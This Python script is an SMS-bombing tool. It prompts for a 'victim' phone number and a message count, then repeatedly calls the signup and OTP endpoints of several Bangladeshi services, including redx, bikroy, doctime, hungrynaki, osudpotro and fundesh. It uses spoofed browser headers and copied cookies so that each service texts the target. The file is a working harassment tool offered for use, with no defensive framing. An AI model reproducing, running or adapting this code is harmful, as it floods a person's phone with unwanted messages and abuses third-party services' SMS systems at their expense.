import sys
import os
import requests

class color:
    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
def banner():
    print(color.yellow + '''                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-    Author : murad islam  :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<                                                                         
                    `-'                                                                         
                                                                                                
                           ''')
os.system("clear")
banner()

num = input(color.green + "Enter Victim phone number:->>")
limit = int(input(color.green + "Enter your limit:->>"))
ses = 0

headers1 = {
    'referer': 'https://redx.com.bd/',
    'user-agent':'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

headers2 = {
    'authority': 'bikroy.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'bn',
    'application-name': 'web',
    'referer': 'https://bikroy.com/bn/users/login',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

headers3 = {
    'authority': 'www.ieatery.com.bd',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'referer': 'https://www.ieatery.com.bd/login',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}


headers4 = {
    'Accept': '*/*',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Origin': 'https://ecourier.com.bd',
    'Referer': 'https://ecourier.com.bd/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'user-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
  
data1 = {
    'name': num,
    'phoneNumber': num,
    'service': 'redx'
}

headers5 = {
    'referer': 'https://doctime.com.bd/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

data2 = {
    'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
    'code': '88',
    'contact_no': num,
    'country_calling_code': '88',
}

headers8 = {
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Origin': 'https://hungrynaki.com',
    'Referer': 'https://hungrynaki.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'accept': '*/*',
    'content-type': 'application/json',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
  }
  
data8 = {
    'operationName': 'createOtp',
    'variables': {
        'phone':""+num,
        'country': '880',
        'uuid': '6fdb595b-a310-4f82-acca-a9b9c43e4eb0',
        'osVersionCode': 'Linux aarch64',
        'deviceBrand': 'Chrome',
        'deviceModel': '107',
        'requestFrom': 'U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=',
    },
    'query': 'mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n',
}

headers7 = {
    'referer': 'https://osudpotro.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}
  
data4 = {
    'mobile': '+88-0'+num,
    'deviceToken': 'web',
    'language': 'en',
    'os': 'web',
}

cookies9 = {
    '_ga': 'GA1.3.1671188319.1677642641',
    '_gid': 'GA1.3.407134519.1677642641',
    '_gat_UA-146796176-2': '1',
    '_fbp': 'fb.2.1677642641903.2005162471',
    '_ga_5LF4359FD3': 'GS1.1.1677642640.1.1.1677642660.0.0.0',
}
  
headers9 = {
    'authority': 'fundesh.com.bd',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://fundesh.com.bd',
    'referer': 'https://fundesh.com.bd/fundesh/profile',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}
  
params9 = {
    'service_key': '',
}
  
json_data9 = {
    'msisdn': ''+num,
}

headers6 = {
    'referer': 'https://osudpotro.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}
  
data3 = {
    'mobile': '+88-0'+num,
    'deviceToken': 'web',
    'language': 'en',
    'os': 'web',
}

url1="https://api.redx.com.bd/v1/user/signup"
url2= "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+num
url3="https://www.ieatery.com.bd/otp-verify?phn="+num
url4 = 'https://api-v4-1.hungrynaki.com/graphql'
url5="https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile="+num
url6 = "https://admin.doctime.com.bd/api/authenticate"


# sent sms

while ses < limit:
    rsp1 = requests.post(url1, headers=headers1, data=data1)
    if rsp1.status_code == 200:
        print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
        ses = ses + 1
    else:
        pass
    rsp2 = requests.get(url2, headers=headers2)
    if rsp2.status_code == 200:
        ses = ses + 1
        print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
        pass
    rsp3 = requests.get(url3, headers=headers3)
    if rsp3.status_code == 200:
        ses = ses + 1
        print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
        pass
    rsp4 = requests.get(url5, headers=headers4)
    if rsp4.status_code == 200:
        ses = ses + 1
        print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
        pass
    rsp5 = requests.post(url6, headers=headers5, data=data2)
    if rsp5.status_code == 200:
        ses = ses + 1
        print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
        pass
    rsp7 = requests.post('https://api.osudpotro.com/api/v1/users/send_otp', headers=headers7, data=data4)
    if rsp7.status_code == 200:
        ses = ses + 1
        print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
        pass
    sent9=requests.post(
        'https://fundesh.com.bd/api/auth/generateOTP',
        params=params9,
        cookies=cookies9,
        headers=headers9,
        json=json_data9,
    )
    if sent9.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    sent6=requests.post('https://api.osudpotro.com/api/v1/users/send_otp', headers=headers6, data=data3)
    if sent6.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
    else:
      pass
    if ses == limit:
        print("Thanks for using my tool")
        os.system("cls")
        banner()
        break

